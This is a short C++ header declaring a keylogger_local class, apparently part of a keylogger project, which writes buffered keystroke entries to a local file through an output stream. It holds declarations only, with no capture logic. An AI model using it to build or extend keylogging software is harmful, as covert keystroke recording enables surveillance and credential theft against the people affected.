#ifndef _KEYLOGGER_LOCAL_HPP_
#define _KEYLOGGER_LOCAL_HPP_

#include "../keylogger.hpp"

class keylogger_local : virtual public keylogger
{
	private:
		ofstream* a_ofstream;

	public:
		/*
		* Constructor with parameters
		*
		* Open attribute a_ofstream with parameter p_destination_path
		*
		* p_destination_path : Destination to store entry
		*/
		keylogger_local(size_t p_buffer_size, string p_destination_path);

		/*
		* Destructor
		*/
		virtual ~keylogger_local();

		/*
		* Store data by sending them to a_ofstream
		*/
		virtual void store();
};

#endif
